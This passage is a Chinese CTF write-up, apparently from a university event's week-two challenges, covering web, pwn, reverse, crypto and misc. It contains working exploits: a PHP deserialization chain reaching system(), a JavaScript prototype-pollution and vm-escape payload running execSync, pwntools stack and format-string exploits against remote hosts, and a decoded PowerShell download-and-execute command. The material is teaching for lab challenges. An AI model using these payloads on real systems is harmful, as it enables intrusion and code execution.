        $this->funcs = $funcs;
    }

    public function __call($name, $args) {
        $this->funcs[$name](...$args);
    }
}
```

`__call` 方法会按照传入的 name 从 funcs 数组中取出对应的函数名, 然后将 args 作为参数, 动态调用这个函数, 这里就是最终的利用点, 也就是可以 getshell 的地方

我们如果想要到达 Helper 的 `__call` 方法, 就必须得让 Cache 类的 expired 属性为 True, 但是 Cache 类存在 `__wakeup` 方法, 这就会导致在反序列化刚开始的时候这个 expired 属性会被强制设置为 False, 看起来没有办法绕过

这里引入 PHP  "引用" 的概念, 跟 C 语言类似, 引用是一个类似于指针的东西

```php
$a = 123;
$b = &a; # 将 $a 变量的引用赋值给 $b
```

此时 b 的值就等于 a 的值, 如果 b 被修改, 那么 a 也会被修改, 反之亦然, a 和 b 指向相同的内存地址

那么纵观整个代码, 我们可以让 expired 属性成为某个变量的引用, 这样即使 expired 为 False, 在后续的过程中只要这个被引用的变量被修改为其它值, 那么 expired 也会被修改为相同的值, 只要这个目标值不为 NULL 即可绕过 if 的判断

payload

```php
<?php

class Cache {
    public $key;
    public $value;
    public $expired;
    public $helper;
}

class Storage {
    public $store;
}

class Helper {
    public $funcs;
}

class DataObject {
    public $storage;
    public $data;
}

$helper = new Helper();
$helper->funcs = array('clean' => 'system');

$cache1 = new Cache();
$cache1->expired = False;

$cache2 = new Cache();
$cache2->helper = $helper;
$cache2->key = 'id';

$storage = new Storage();
$storage->store = &$cache2->expired;

$dataObject = new DataObject();
$dataObject->data = array('key1' => $cache1, 'key2' => $cache2);
$dataObject->storage = $storage;

echo serialize($dataObject);
?>
```

首先我们往 dataObject 的 data 里面放入了两个 Cache 实例: cache1 和 cache2

其中 cache2 指定了 helper, 其 key 设置成了要执行的命令 `id`, helper 的 funcs 数组放入了 system 字符串

然后我们让 storage 的 store 属性成为 cache2 expired 属性的引用

这样, 在反序列化时, 首先会调用两个 Cache 的 `__wakeup` 方法, 将各自的 expired 设置为 False

然后调用 dataObject 的 `__destruct` 方法, 从而调用 Storage 的 `__set` 方法

Storage 首先将 store (即 cache1 的 expired 属性) 初始化为一个空数组, 然后存入 cache1

此时, store 不为空, 那么也就是说 cache1 的 expired 属性不为空

然后来到 cache2, storage 的 `__set` 方法调用它的 expired 方法, 进入 if 判断

因为此时 cache2 的 expired 字段, 也就是上面的 store, 已经被设置成了一个数组, 并且数组中存在 cache1 (不为空), 因此这里 if 表达式的结果为 True

最后进入 helper 的 clean 方法, 执行 `system('id');` 实现 RCE

#### ez_sandbox

考察简单的 JavaScript 原型链污染绕过 + vm 沙箱逃逸

代码在注册和登录的时候使用了 `clone(req.body)`

```javascript
function merge(target, source) {
    for (let key in source) {
        if (key === '__proto__') {
            continue
        }
        if (key in source && key in target) {
            merge(target[key], source[key])
        } else {
            target[key] = source[key]
        }
    }
    return target
}

function clone(source) {
    return merge({}, source)
}
```

根据一些参考文章, 很容易就可以知道这里存在原型链污染, 但是 `__proto__` 关键词被过滤了

如果你对原型链这个概念稍微做一点深入了解, 就可以知道, 对于一个实例对象, 它的 `__proto__` 就等于 `constructor.prototype` (或者仔细搜一搜也能在网上找到现成的 payload), 用这个就可以绕过上面对 `__proto__` 关键词的过滤

先注册一个 test 用户, 在登录时 POST 如下内容, 污染 admins 对象, 使得 `username in admins` 表达式的结果为 True

```json
{
    "username": "test",
    "password": "test",
    "constructor": {
        "prototype": {
            "test": "123"
        }
    }
}
```

然后是一个简单的 vm 沙箱逃逸

https://xz.aliyun.com/t/11859

代码会 catch vm 沙箱执行时抛出的异常, 并访问异常的 message 属性

那么结合上面的文章, 可以通过 throw 抛出对象的思路, 拿到 `arguments.callee.caller` (指向当前函数的调用者), 然后拿到沙箱外的 process 对象, 最终实现 RCE

waf 函数有一些简单的关键词过滤, 不过因为 Javascript 语言本身非常灵活, 所以可以使用中括号 + 字符串拼接的形式绕过

https://www.anquanke.com/post/id/237032

下面两种方式都行

```javascript
// method 1
throw new Proxy({}, { // Proxy 对象用于创建对某一对象的代理, 以实现属性和方法的拦截
    get: function(){ // 访问这个对象的任意一个属性都会执行 get 指向的函数
        const c = arguments.callee.caller
        const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))()
        return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString();
    }
})
// method 2
let obj = {} // 针对该对象的 message 属性定义一个 getter, 当访问 obj.message 时会调用对应的函数
obj.__defineGetter__('message', function(){
    const c = arguments.callee.caller
    const p = (c['constru'+'ctor']['constru'+'ctor']('return pro'+'cess'))()
    return p['mainM'+'odule']['requi'+'re']('child_pr'+'ocess')['ex'+'ecSync']('cat /flag').toString();
})
throw obj
```

### Pwn

#### 滑跪

看第一周校内没人打第二周前一天晚上紧急出了几个送分题，然后出了各种岔子，给各位师傅带来不好的体验实在抱歉。

#### calc

没啥好说的，python和pwntools使用。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process("../dist/pwn")
s=remote("8.130.35.16",55001)
for i in range(100):
    s.recvuntil(b"====\n")
    a=int(s.recvuntil(b"+")[:-1])
    b=int(s.recvuntil(b"=")[:-1])
    #print(f"{a}+{b}={a+b}")
    s.sendline(str(a+b).encode())
s.interactive()
```

#### ezshop

> 写wp的时候才想到买东西直接++而不是+cnt，我是铸币

减法，而且cnt没查负数，看有没有还只是查0。

直接买-1个收工。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
s=process("../dist/pwn")
s.sendlineafter(b">> ",b"1")
s.sendlineafter("？\n".encode(),b"3")
s.sendlineafter("？\n".encode(),b"-1")
s.sendlineafter(b">> ",b"2")
s.interactive()
```

#### ezcanary

> 本来这道题应该是这样的
>
> ```c
> char binsh[]="/bin/sh";
> void backdoor() {
>  system("echo 'No backdoor!'");
> }
> ```
>
> 需要写一小段ROP，但改完push回ci的时候忘记先编译了。结果直接ret2backdoor了。
>
> 前一天照着新程序写的exp结果没打通想着留到第二天再打，没想到直接放的旧附件，也就有了week2-day1的那一出反复横跳的闹剧。

覆盖低位canary的0带出来canary，然后在下一步的栈溢出写回去。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=remote("8.130.35.16",55000)
elf=ELF("../dist/pwn")
s=process("../dist/pwn")
rdi=0x40138b
binsh=0x404068
system=0x401050
backdoor=elf.sym.backdoor
s.sendafter(b"Ur name plz?\n",b"a"*0x19)
s.recvuntil(b"a"*0x19)
canary=u64(b"\x00"+s.recv(7))
success(hex(canary))
s.sendafter(b"right?",b"Y")
s.sendafter(b"plz.\n",flat([
    b"a"*0x18,canary,0x404500,backdoor
]))
s.interactive()
```

#### fmt1

修改栈上变量，只需要改1byte，还有指向它的指针。

一行解决。

```py
payload="%35c%39$hhn"
```

有人来问fmt顺手想到一个非预期，反正在8bytes以内，那直接都清零不就得了。

当然如果改成两个`unsigned long long`应该就能防住了吧。

```py
payload="%39$lln
```

#### fmt2

修改bss上变量，不过给了循环。

可以一点一点改，也可以直接构造一长串（

后期基本都要自动化构造了，比如用fmt写ROP链之类的。可以试试自己写一版。

```py
from pwn import *
context(arch='amd64', os='linux', log_level='debug')
#s=process('../dist/fmt2')
s=remote("192.168.3.253",52001)
#pause()
s.sendlineafter(b"content: ",b"%33$p")
elf_base=eval(s.recv(14))-0x1280
target=elf_base+0x4048
p=f"%{0xef}c%12$hhn%{0x100-0xef+0xbe}c%13$hhn%{0x100-0xbe+0xad}c%14$hhn%{0xde-0xad}c%15$hhna".encode()
for i in range(4):
    p+=p64(target+i)
s.sendafter(b"content: ",p)
s.interactive()
```

#### leak-env

environ中存放着栈相关地址，gdb挂上调一下就能知道跟当前函数栈底差多少。

还给了0x30的任意写，直接打`one_gadget`或者`system("/bin/sh")`

```py
from pwn import *
context(arch="amd64",os="linux",log_level="debug")
libc=ELF("../dist/libc.so.6")
#s=process("./leakenv")
s=remote("192.168.3.253",52003)
s.recvuntil(b"Here's your gift: ")
libc.address=eval(s.recvline()[:-1])-libc.sym.printf
environ=libc.sym.__environ
s.sendlineafter(b"read?",hex(environ)[2:].encode())
s.recvuntil(b"Here you are: ")
stack=u64(s.recv(8))
target=stack-0x100
s.sendlineafter(b"it?",hex(target)[2:].encode())
s.sendafter(b"it.\n",flat([
    0x0000000000023b63+libc.address,0,0,0,0,
    libc.address+0xe3afe,
]))
s.interactive()
```

### Reverse

#### 符文解密师

拿到程序，利用IDA打开后，F5反编译*main*函数，可以看到如下内容。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717275873.png)

根据逻辑，可以看出我们需要输入的内容是*deadc0de*，输入后即可得到*flag*

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717280646.png)

#### 编译逆旅者

解压发现是个pyc文件，我们使用在线反编译工具处理(比较方便)

[在线工具](https://tool.lu/pyc/) 

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717281598.png)

根据反编译结果，我们得知python版本以及需要输入的值。直接运行pyc文件输入即可得到*flag*。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717282083.png)

#### 码海舵师

拿到程序后，依然是用IDA打开，F5反编译*main*函数后，可以看到如下内容。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717282985.png)

稍微分析一下可以看出，这里*sub_401310*为base64编码函数，当然，看到程序内这种带*\=\*的字符串，我们也可以直接猜测是base64编码。进行BASE64解码后即可得到*flag*。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717283667.png)

#### 注册侦探

拿到程序，IDA打开后，F5反编译*main*函数，可以看到如下内容。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717284213.png)

可以知道程序在检测注册表项的值

> HKEY_CURRENT_USER\Software\0xGame\registered

是否为1，如果为1则输出*flag*。这里我们直接创建这个注册表值并将其修改为1即可得到*flag*。

#### 壳艺大师

拿到程序，丢入IDA分析，发现报错，查下壳。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717284942.png)

可以发现是UPX壳，使用**upx -d**命令脱壳后，再次丢入IDA分析，可以看到如下内容。

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717285559.png)

其中的*a1*的值可以在*sub_1400016E0*函数中看到，为*The0xGameKey*

如下是内置的数据

![](https://ctf.njupt.edu.cn/wp-content/uploads/2023/11/2023110717290271.png)

算法核心可以看出是对输入的字符串用*The0xGameKey*进行异或运算，然后与内置的数据按byte比较，这里我们将内置的数据与*The0xGameKey*进行异或运算，即可得到*flag*。

### Crypto

#### 中间的那个人

考点：

+ DH算法
+ 简单的爆破

DH算法具体细节和作用，望新师傅们利用搜索引擎了解一下，这里不细谈。这道题比较简单，有些时候面对未知密钥的时候，需要考虑爆破求解，那么这时候就要进行一定的计算量估计，这题不管是求A还是B都是可以出的来的，两者的位数比32位低，也没啥限制，还是可以求的。

exp:

```python
from Crypto.Util.number import *
from Crypto.Cipher import AES
from hashlib import sha256
g=2
p=250858685680234165065801734515633434653
Bob=33067794433420687511728239091450927373
Alice=235866450680721760403251513646370485539

x = 3992780394
key = pow(Bob,x,p)
key = sha256(long_to_bytes(key)).digest()
iv = b"0xGame0xGameGAME"
aes = AES.new(key, AES.MODE_CBC, iv)
enc=b's\x04\xbc\x8bT6\x846\xd9\xd6\x83 y\xaah\xde@\xc9\x17\xdc\x04v\x18\xef\xcf\xef\xc5\xfd|\x0e\xca\n\xbd#\x94{\x8e[.\xe8\xe1GU\xfa?\xda\x11w'

flag = aes.decrypt(enc)
print(flag)
#b'0xGame{51393fe1fd5fc2df1bf018d06f0fa11d}\x08\x08\x08\x08\x08\x08\x08\x08'
```

那么简单的DLP可以通过爆破去求解，但是遇到更加困难的离散对数问题的时候，我们就必须开始考虑是否存在更优的算法去求解这个问题了。

#### What's CRT?

考点：

+ 中国剩余定理
+ 对逆元的理解运用
+ 解方程

小彩蛋：公钥260792700是一个QQ号码，因为出题人的Q号拿来做公钥不怎么合适就用小号来玩了。

这题可能是我弄得有点复杂了，因为考虑到第一周逆向题里面大家已经做过解方程的题了，就不直接放出q,p了（本意就是想直接送出q,p,q_,p\_的）。

思路：首先解方程
$$
q+p=gift\\
q*p=N
$$
用高中知识还是直接用函数库解都可以，我选择用sagemath自带的函数：

```python
mygift=[15925416640901708561793293991573474917595642805739825596593339102414328214313430010166125066639132916608736569443045051644173933089503934675628814467277922, 18342424676996843423829480445042578097182127446865571536445030052846412665700132683433441858073625594933132038175200824257774638419166516796318527302903098]
n=63329068473206068067147844002844348796575899624395867391964805451897110448983910133293450006821779608031734813916287079551030950968978400757306879502402868643716591624454744334316879241573399993026873598478532467624301968439714860262264449471888606538913071413634346381428901358109273203087030763779091664797
n_=84078907800136966150486965612788894868587998005459927216462899940718213455112139441858657865215211843183780436155474431592540465189966648565764225210091190218976417210291521208716206733270743675534820816685370480170120230334766919110311980614082807421812749491464201740954627794429460268010183163151688591417
var('q p q_ p_')
solve([q+p==gift[0],q*p==n,q_+p_==gift[1],q_*p_==n_],q,p,q_,p_)
```

拿到因子之后考虑直接求私钥解题，但是可以发现求不出来，原因是：
$$
gcd(e,phi)==4
$$
在上周的题中，我们已经知道只有在e,phi互质的时候才能求出逆元，所以考虑退而求次，求解另外一个逆元：
$$
令e'=\frac{e}{4},求d' \equiv e'^{-1}(mod\phi(n))\\
得c^{d'} \equiv m^{e*d'} \equiv m^{4*\frac{e}{4}*d'} \equiv m^{4} (modn)\\
但是发现:m^{4}>n，m^{4}=c^{d'}+k*n\\
我们并不能直接开根
$$
此时就需要利用中国剩余定理去将模数进行变换，用来求解以下情况：
$$
\begin{align}
\left\{     
	\begin{aligned}
	x=a_1(modm_1)\\
	x=a_2(modm_2)\\
	x=a_3(modm_3)\\
	x=a_4(modm_4)\\
	\end{aligned}
\right.
\end{align}
$$
证明：

![proof](../../../C:\Users\Administrator\Desktop\题目\0xGame\第二周\proof.png)

那么知道公式的情况下，直接按照公式去构造就可以了，需要注意的是不同模数之间必须**互质**。

exp:

```python
import gmpy2
from Crypto.Util.number import *
p_=8991690869897246321907509983425307437365288417861457732721314572165773880898701105065818281248373676758405021157703190132511219384704650086565345885727777
q_=9350733807099597101921970461617270659816839029004113803723715480680638784801431578367623576825251918174727017017497634125263419034461866709753181417175321
q = 7687653192574283689842465763299611592007909813801176843577189341409409692975753037402253496632410364594655611337156337669083582400443042348458268161331043
p = 8237763448327424871950828228273863325587732991938648753016149761004918521337676972763871570006722552014080958105888713975090350689060892327170546305946879
e = 260792700
mygift=[15925416640901708561793293991573474917595642805739825596593339102414328214313430010166125066639132916608736569443045051644173933089503934675628814467277922, 18342424676996843423829480445042578097182127446865571536445030052846412665700132683433441858073625594933132038175200824257774638419166516796318527302903098]
mq_=6229615098788722664392369146712291169948485951371133086154028832805750551655072946170332335458186479565263371985534601035559229403357396564568667218817197
mp_=7514598449361191486799480225087938913945061715845128006069296876457814528347371315493644046029376830166983645570092100320566196227210502897068206073043718
n=63329068473206068067147844002844348796575899624395867391964805451897110448983910133293450006821779608031734813916287079551030950968978400757306879502402868643716591624454744334316879241573399993026873598478532467624301968439714860262264449471888606538913071413634346381428901358109273203087030763779091664797
n_=84078907800136966150486965612788894868587998005459927216462899940718213455112139441858657865215211843183780436155474431592540465189966648565764225210091190218976417210291521208716206733270743675534820816685370480170120230334766919110311980614082807421812749491464201740954627794429460268010183163151688591417
c=12623780002384219022772693100787925315981488689172490837413686188416255911213044332780064192900824150269364486747430892667624289724721692959334462348218416297309304391635919115701692314532111050955120844126517392040880404049818026059951326039894605004852370344012563287210613795011783419126458214779488303552
def CRT(r,d):
    M = 1
    l = len(r)
    for i in range(0,l):
        M = d[i] * M
    x = 0
    for i in range(0,l):
        md = M//d[i]
        x = (x + gmpy2.invert(md, d[i])  * md *r[i] )%M
    return int(M+x% M)%M

phi = (q-1)*(p-1)
d = gmpy2.invert(e//4,phi)
m2 = pow(c,d,n)
mq = m2%q
mp = m2%p

m = CRT([mq,mp,mq_,mp_],[q,p,q_,p_])
m = (gmpy2.iroot(m,4))[0]
print(long_to_bytes(m))
#b'0xGame{7881ed67088e9f72b860f8c376599785}'
```

题后总结，基本解法需要使用到的函数、数学知识在上周都了解过了，剩下的就是一个中国剩余定理的考点，望周知。

以上是预期的解法，下面放出一些非预期解，用SageMath自带的有限域开方的函数nthroot_mod()，也是可以的，还有师傅说能直接phi//4后直接求逆元进行求解也是可以，总之解法蛮多。

有限域开方(同理AMM算法一样是可以的):

```python
from sympy.ntheory.residue_ntheory import nthroot_mod
from Crypto.Util.number import long_to_bytes
mq = 5483807329382755718534658156318758332123717229277317863013790997411503349042875734915035632700621630439238266035050249716944006841331162719856335040284265
q = 7687653192574283689842465763299611592007909813801176843577189341409409692975753037402253496632410364594655611337156337669083582400443042348458268161331043
m = nthroot_mod(mq,4,q)
print(long_to_bytes(m))
b'0xGame{7881ed67088e9f72b860f8c376599785}'
```

在某些特殊情况下（多半是出题人的为难），e和phi是不互素的，

那么当pow(m,gcd(e,phi),n)<n时，我们可以采用直接开方的办法，

当pow(m,gcd(e,phi),n)时，一般我们采用有限域开方、中国剩余定理换模，有些时候有限域开方的办法不同，或者是条件更加特殊(可以参照NCTF2019的题)，就需要在这个基础上去思考更多的问题，感兴趣的师傅可以了解一下。

#### EzRSA

考点：

+ 费马小定理
+ 光滑数分解
+ 连分数分解

hint已经给出所有考点，题目的交互脚本也给了，本意就是上点送分题的，，

因为交互也不算太复杂，直接连上去之后把数据拖到本地解就可以了，详细的概念和知识点这里就不拓展了，在[这里](https://ctf-wiki.org/crypto/introduction/)，都有详细的介绍。

exp:

```python
#数据从服务器上面拖下来解就好，这里就只做分解，不做解密了

#challenge1
gift = 
N = 
q = GCD(gift-1,N)
p = N//q
print(f'p={p}\nq={q}')

#challenge2
N = 
a = 2
n = 2
while True:
    a = gmpy2.powmod(a, n, N)
    res = gmpy2.gcd(a-1, N)
    if res != 1 and res != N:
        q = N // res
        print("p=",res)
        print("q=",q)
        break
    n += 1

#challenge3
def transform(x,y):    #使用辗转相除将分数x/y转为连分数的形式
    res=[]
    while y:
        res.append(x//y)
        x,y=y,x%y
    return res
def continued_fraction(sub_res):
    numerator,denominator=1,0
    for i in sub_res[::-1]:   #从sublist的后面往前循环
        denominator,numerator=numerator,i*numerator+denominator
    return denominator,numerator   #得到渐进分数的分母和分子，并返回
#求解每个渐进分数
def sub_fraction(x,y):
    res=transform(x,y)
    res=list(map(continued_fraction,(res[0:i] for i in range(1,len(res)))))  #将连分数的结果逐一截取以求渐进分数
    return res
 
def wienerAttack(n1,n2):
    for (q2,q1) in sub_fraction(n1,n2):  #用一个for循环来注意试探n1/n2的连续函数的渐进分数，直到找到一个满足条件的渐进分数
        if q1==0:
            continue
        if n1%q1==0 and q1!=1:
            return (q1,q2)
    print("该方法不适用")
 
N1=
N2=
print(wienerAttack(N1,N2))
```

#### EzLFSR

考点：

+ 矩阵的理解应用
+ 线性反馈移位寄存器
+ SageMath的应用(直接解方程不用也行，这里还是推荐使用)

这题是出题人从网上摁抄的，可能直接搜索都能搜得出原题，重点是想让大家了解**异或**和**按位**与这两个操作其实就是mod2下的**加法**和**乘法**，以及矩阵的构造(如果是大一新师傅的话，这个时间点应该也学到了矩阵怎么构了)。

从网上搜索就能知道LFSR的概念，这个就是反复的：按照状态位计算，生成新的状态位，直接解了这个128元方程组就好，结合矩阵的知识，用逆矩阵去求解题设的增广矩阵就好了。         

exp:

```python
#SageMath
from Crypto.Util.number import *
def string2bits(s):
    return [int(b) for b in s]

initState = [0, 1, 0, 1, 1, 0, 0, 1, 1, 0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 1, 1, 1, 0, 0, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 0, 1, 0, 1, 0, 0, 1, 0, 1, 1, 0, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 1, 1, 1, 1, 0, 1, 1, 0, 1, 0, 1, 0, 0, 1, 1, 1, 1, 0, 0, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 1, 1, 0, 1, 0, 0]
outputState = string2bits('1101111111011101100001000011111101001000111000110100010011110111010011100110100100111001101010110110101110000011110101000110010010000011111111001111000110111001100111101110010100100001101001111110001010000100111101011011100010000000100000100000100111010110')
states = initState + outputState

ms = MatrixSpace(GF(2), 128, 128)
mv = []
for i in range(128):
    mv += states[i : i + 128]
m= ms(mv)

vs = MatrixSpace(GF(2), 128, 1)
vv = outputState[0:128]
v = vs(vv)

secret = m.inverse() * v
M=secret.str().replace('\n','').replace('[','').replace(']','')
print(long_to_bytes(eval('0b'+M)))
```

#### Fault!Fault!

考点：

+ 数学推导、数据处理
+ 远程交互脚本的编写

关于推导的过程和原理直接看这篇[文章](https://www.jianshu.com/p/6a166e3fcb22)就好，如果没推过的话直接百度“RSA Fault”都能出的来这篇文章，所以我觉得理解这部分应该不会太复杂。

脚本编写部分：首先因为服务器有时间限制、交互要验证等一系列的原因，一般不推荐写好脚本了再去和服务器交互、调试脚本，容易浪费时间、搞自己心态，我的建议是在自己本地上部署一遍题目，或者是模拟题目的条件再调试数据，看看符不符合自己的预期、设定。

其次就是在这种时间限定要拿很多数据的情况下，就不推荐一边拖数据一边做数据处理了，影响速度，建议是写好数据处理的脚本之后，直接从服务器拖下我们需要的1024组数据，本地运算一遍交上去就行，方便故障排查、也不会浪费很多时间。

exp:

```python
#part1 拖数据:
from pwn import *
import itertools
import hashlib 
import string

def proof(io):
    io.recvuntil(b"XXXX+")
    suffix = io.recv(16).decode("utf8")
    io.recvuntil(b"== ")
    cipher = io.recvline().strip().decode("utf8")
    for i in itertools.product(string.ascii_letters+string.digits, repeat=4):
        x = f"{i[0]}{i[1]}{i[2]}{i[3]}"
        proof=hashlib.sha256((x+suffix).encode()).hexdigest()
        if proof == cipher: break
    print(x)
    io.sendlineafter(b"XXXX:",x.encode())

f = open('data.txt','a')
io = remote('43.139.107.237',10005)
proof(io)
io.recvuntil(b'>')
io.sendline(b'S')
io.recvuntil(b'>')
io.sendline(b'test')
n = int(io.recvline())
e = int(io.recvline())
c = int(io.recvline())
for i in range(1023):
    io.recvuntil(b'>')
    io.sendline(b'F')
    io.recvuntil(b'>')
    io.sendline(f'{c}'.encode())
    io.recvuntil(b'>')
    io.sendline(f'{i}'.encode())
    io.recvline()
    m_ = int(io.recvline())
    f.write(str(m_)+'\n')

io.close()
f.close()
print(f'n={n}')
print(f'c={c}')

#part2 处理数据:
from Crypto.Util.number import *

m = b'test'
m = bytes_to_long(m)
n=97914749446436063122542581376873112820400732267124998400088179058780712855378248201542023213009277089224170180542304344638059090556781844777641757174279080863658472878763702075705376304717343862101956239090701126225622317784075619757963099253602226642056966461019740454740445226152574361794251236011891077789
c=73133825445675329950286077126832004352164006658709453405485979363609175208129785294437379266100324978770868694885347204515053234232666436453863941132493106687387106354265743735994029551983269772204386433432638435914078485461320417024614354676213557287698752845797412775400104995650602775848941301838035593870

e = 65537

dbin = ''
with open('data.txt','r') as f:
	for i in range(1023):#私钥位数不同可能要判断的数量不同
		m_ = int(f.readline())
		h = (inverse(m,n)*m_)%n
		test = pow(c,2**i,n)
		if h == test:
			dbin += '0'
		elif h == inverse(test,n):
			dbin += '1'

d = eval('0b'+dbin[::-1])#校验
if (pow(c,d,n)==m):
	print(d)
#最后把私钥交上去就拿到flag了
```

小思考：虽然时间是有一定的限制，但这道题的私钥是固定的，所以我们可以多次交互拿数据推导出这个私钥。

但是如果这个私钥不是固定的呢？我们只有一次交互的机会，多次交互拿数据推导出这个私钥这个思路恐怕不太行，不管怎么优化可能时间都是不太够的，那么我们要如何处理这种情况？哈哈，我们第四周再见。

### Misc

#### 8848

没什么好说的，看hint给的文章就够了

--> https://baijiahao.baidu.com/s?id=1741918719317952751&wfr=spider&for=pc

只需要对所给的密码进行简单的变换即可

![](https://pic.imgdb.cn/item/654895e9c458853aef6562b2.jpg)

![](https://pic.imgdb.cn/item/654895f5c458853aef658068.jpg)

#### 勇者的奇妙冒险

shelve库在使用的的时候会把东西存放在内存里来操作而不走数据库，所以直接开两个终端一个放开头 一个开始走，走到头之后另一个再向前走一步再向后走一步就可以了，更新位置数据但是flag状态仍然 是拥有flag(注意还得两次名字相同)

![](https://pic.imgdb.cn/item/65489614c458853aef65d3d7.jpg)

#### notverybadusb

badusb流量，原理是模拟键盘输入，只不过开头多了一个字节，直接一把梭

先筛选特定的流量

![](https://pic.imgdb.cn/item/6548963dc458853aef663e60.jpg)

然后导出

![](https://pic.imgdb.cn/item/65489654c458853aef669bd8.jpg)

然后直接脚本启动

```
import os
os.system("tshark -r 1.pcapng -T fields -e usb.capdata > usbdata.txt")
normalKeys = {"04":"a", "05":"b", "06":"c", "07":"d", "08":"e", "09":"f", "0a":"g", "0b":"h", "0c":"i", "0d":"j", "0e":"k", "0f":"l", "10":"m", "11":"n", "12":"o", "13":"p", "14":"q", "15":"r", "16":"s", "17":"t", "18":"u", "19":"v", "1a":"w", "1b":"x", "1c":"y", "1d":"z","1e":"1", "1f":"2", "20":"3", "21":"4", "22":"5", "23":"6","24":"7","25":"8","26":"9","27":"0","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"-","2e":"=","2f":"[","30":"]","31":"\\","32":"<NON>","33":";","34":"'","35":"<GA>","36":",","37":".","38":"/","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}

shiftKeys = {"04":"A", "05":"B", "06":"C", "07":"D", "08":"E", "09":"F", "0a":"G", "0b":"H", "0c":"I", "0d":"J", "0e":"K", "0f":"L", "10":"M", "11":"N", "12":"O", "13":"P", "14":"Q", "15":"R", "16":"S", "17":"T", "18":"U", "19":"V", "1a":"W", "1b":"X", "1c":"Y", "1d":"Z","1e":"!", "1f":"@", "20":"#", "21":"$", "22":"%", "23":"^","24":"&","25":"*","26":"(","27":")","28":"<RET>","29":"<ESC>","2a":"<DEL>", "2b":"\t","2c":"<SPACE>","2d":"_","2e":"+","2f":"{","30":"}","31":"|","32":"<NON>","33":"\"","34":":","35":"<GA>","36":"<","37":">","38":"?","39":"<CAP>","3a":"<F1>","3b":"<F2>", "3c":"<F3>","3d":"<F4>","3e":"<F5>","3f":"<F6>","40":"<F7>","41":"<F8>","42":"<F9>","43":"<F10>","44":"<F11>","45":"<F12>"}


nums = []
keys = open('usbdata.txt')
for line in keys:
    #print(line)
    if len(line)!=17: #首先过滤掉鼠标等其他设备的USB流量
         continue
    nums.append(line[0:2]+line[4:6]) #取一、三字节
    #print(nums)
keys.close()
output = ""
for n in nums:
    if n[2:4] == "00" :
        continue

    if n[2:4] in normalKeys:
        if n[0:2]=="02": #表示按下了shift
            output += shiftKeys [n[2:4]]
        else :
            output += normalKeys [n[2:4]]
    else:
        output += '[unknown]'
print('output :' + output)
```

注意要去掉前两个字节，所以得在第十行和第十二行之间加上一句

```
line = line[2:]
```

得到键盘输入

```
rcmd<RET>powershell<SPACE>-windowstyle<SPACE>hidden<SPACE>IEX<SPACE>(New-
Object<SPACE>Net.WebClient).DownloadString('http://zysgmzb.club/hello/notveryevi l.ps1');<RET>
```

访问脚本地址得到脚本内容

```
$userHome = $env:USERPROFILE

$savePath = Join-Path -Path $userHome -ChildPath "Desktop\evil.exe"

$downloadUrl =
"https://autopatchcn.bhsr.com/client/cn/20230811104659_pn5QBAAp94eSn89l/StarRail _setup_gw_20230828.exe"

$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($downloadUrl, $savePath)

if (Test-Path $savePath) {
Start-Process -FilePath $savePath
} else {
exit
}
```

直接下载会发现是星穹铁道安装包(?

md5sum即可

#### findme2

根据题目描述，直接去github搜索WearyMeadow

![](https://pic.imgdb.cn/item/654896d1c458853aef688e8d.jpg)

可以看到一共两个项目，  一个是博客，另一个是自用的登录脚本

博客里只有一篇上锁的wp

![](https://pic.imgdb.cn/item/654896e0c458853aef68d377.jpg)

结合题目描述说把密码删了，就可以去翻一翻修改记录

![](https://pic.imgdb.cn/item/654896ecc458853aef68fd6e.jpg)

一眼就可以看到密码，直接解锁文章就可以拿到flag和第二周misc全套wp(?

#### chainflag

有关solidity中数组的存储方式以及私有变量的访问方法这里不再过多描述，直接给文章，讲的肯定比我 好

--> https://mp.weixin.qq.com/s/_DV6UaRdA_6pUFXt-EnTtA

了解之后即可编写脚本获取flag，使用web3.py

```
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://49.235.117.196:8545"))
slot = w3.eth.get_storage_at("0x8Eb8A55418FD9431d9e7a3Db67CB631dd96DD99a", "0x0")

print(w3.to_hex(slot))
```

(里面的数据和本题无关

对于偏移的计算也可以用web3.py完成

![](https://pic.imgdb.cn/item/6548971ec458853aef697c6d.jpg)

这样依次读取5个插槽后，再与前面读出来的xornum异或即可得到flag

#### 勇者的链上奇妙冒险

简单的溢出

exp.sol:

```
pragma solidity 0.6.0;
interface adventure {
	function chendian() external;
	function tryattack() external;
	function isSolved() external;
}
contract attack {
	adventure adv;
	constructor(address addr) public {
		adv = adventure(addr);
	}
	function hack() external {
		for(uint i; i < 22; i++) {
			adv.tryattack();
		}
		adv.chendian();
		adv.isSolved();
	}
}
```

